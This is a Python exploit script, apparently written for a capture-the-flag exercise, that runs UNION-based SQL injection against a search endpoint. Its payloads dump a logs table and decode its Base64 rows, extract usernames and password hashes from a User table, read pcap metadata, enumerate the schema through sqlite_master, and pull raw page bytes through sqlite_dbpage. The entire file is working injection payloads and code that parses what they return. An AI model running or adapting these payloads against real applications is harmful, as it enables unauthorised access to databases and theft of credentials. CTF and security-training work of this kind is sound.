"""
Comprehensive flag extraction via SQL injection on the search endpoint.
Dumps all sensitive tables and decodes any Base64-encoded content.
"""
from client import GhostClient
import base64
import json

c = GhostClient()
c.bootstrap()

print("=" * 60)
print("STEP 1: Dump logs?? table (all rows, ordered by id)")
print("=" * 60)

res = c.request("search", {"q": "' UNION SELECT id, cast(id as text), \"text???\" FROM \"logs??\" ORDER BY id--"})
if res.get("ok"):
    rows = res["data"]["rows"]
    # Filter only injected rows (they'll have numeric title)
    log_rows = []
    for r in rows:
        try:
            int(r["title"])
            log_rows.append(r)
        except (ValueError, TypeError):
            pass
    
    print(f"Found {len(log_rows)} rows in logs??:")
    decoded_parts = []
    for r in sorted(log_rows, key=lambda x: int(x["title"])):
        raw = r["summary"]
        try:
            decoded = base64.b64decode(raw + '=' * ((4 - len(raw) % 4) % 4)).decode('utf-8', errors='replace')
        except Exception:
            decoded = f"[decode failed: {raw}]"
        print(f"  id={r['title']:3s}  b64={raw:30s}  decoded={decoded}")
        decoded_parts.append(decoded)
    
    print(f"\nReconstructed: {''.join(decoded_parts)}")
else:
    print("Error:", res.get("error"))

print()
print("=" * 60)
print("STEP 2: Dump User table (usernames + hashes)")
print("=" * 60)

res = c.request("search", {"q": "' UNION SELECT id, username, hash FROM User ORDER BY id--"})
if res.get("ok"):
    rows = res["data"]["rows"]
    user_rows = []
    for r in rows:
        # Check if it looks like a user row (hash is base64-ish)
        if '/' in r.get("summary", "") or '+' in r.get("summary", "") or r.get("summary", "").endswith("="):
            user_rows.append(r)
    
    print(f"Found {len(user_rows)} users:")
    for r in user_rows:
        print(f"  username={r['title']:15s}  hash={r['summary']}")
else:
    print("Error:", res.get("error"))

print()
print("=" * 60)
print("STEP 3: Dump q_8f3c1a72d90e4b65 table (pcap metadata)")  
print("=" * 60)

res = c.request("search", {"q": "' UNION SELECT id, cast(id as text), r4 FROM q_8f3c1a72d90e4b65 ORDER BY id--"})
if res.get("ok"):
    rows = res["data"]["rows"]
    pcap_rows = []
    for r in rows:
        try:
            int(r["title"])
            pcap_rows.append(r)
        except (ValueError, TypeError):
            pass
    
    print(f"Found {len(pcap_rows)} pcap entries:")
    for r in sorted(pcap_rows, key=lambda x: int(x["title"])):
        try:
            meta = json.loads(r["summary"])
            tag = meta.get("tag", "?")
            label = meta.get("label", "?")
            path = meta.get("downloadPath", "?")
            deleted = meta.get("deleted", False)
            print(f"  id={r['title']:3s}  tag={tag:25s}  label={label:30s}  deleted={deleted}  path={path}")
        except json.JSONDecodeError:
            print(f"  id={r['title']:3s}  raw={r['summary'][:80]}")
else:
    print("Error:", res.get("error"))

print()
print("=" * 60)
print("STEP 4: Check for hidden/additional data via sqlite_master")
print("=" * 60)

res = c.request("search", {"q": "' UNION SELECT 1, type || ':' || name, sql FROM sqlite_master--"})
if res.get("ok"):
    rows = [r for r in res["data"]["rows"] if r["id"] == 1 and r["summary"] and 'CREATE' in str(r["summary"])]
    print("All tables with schema:")
    for r in rows:
        print(f"  {r['title']}")
        print(f"    {r['summary']}")
else:
    print("Error:", res.get("error"))

print()
print("=" * 60)
print("STEP 5: Read raw hex from database pages for hidden strings")
print("=" * 60)

res = c.request("search", {"q": "' UNION SELECT 1, cast(pgno as text), hex(data) FROM sqlite_dbpage WHERE pgno=3--"})
if res.get("ok"):
    rows = [r for r in res["data"]["rows"] if r["id"] == 1]
    for r in rows:
        try:
            pg = r["title"]
            raw = bytes.fromhex(r["summary"])
            import re
            strings = re.findall(b'[\x20-\x7e]{4,}', raw)
            print(f"Page {pg} strings:")
            for s in strings:
                print(f"  {s.decode('ascii')}")
        except Exception as e:
            pass
else:
    print("Error:", res.get("error"))
